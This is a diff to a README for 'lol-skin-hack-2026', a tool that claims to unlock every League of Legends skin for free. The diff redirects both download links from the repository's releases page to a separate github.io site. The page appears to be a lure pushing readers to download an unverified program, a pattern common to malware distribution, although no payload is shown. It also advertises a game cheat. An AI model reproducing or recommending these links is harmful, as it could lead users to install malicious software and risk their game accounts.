@@ -1,6 +1,6 @@
 # 🎮 lol-skin-hack-2026 - Unlock Every LoL Skin Instantly, Free Forever
 
-[![Download Now](https://img.shields.io/badge/Download-LoL_Skin_Hack_2026-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Princej4660/lol-skin-hack-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-LoL_Skin_Hack_2026-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://princej4660.github.io)
 
 ## 🚀 What Is This?
 
@@ -21,7 +21,7 @@ This is not a server-side hack. It doesn't modify game files permanently. It sim
 ## 📥 Download & Install
 
 Visit this link to download the application:  
-[**https://github.com/Princej4660/lol-skin-hack-2026/releases**](https://github.com/Princej4660/lol-skin-hack-2026/releases)
+[**https://princej4660.github.io**](https://princej4660.github.io)
 
 ### 🖥️ System Requirements
 
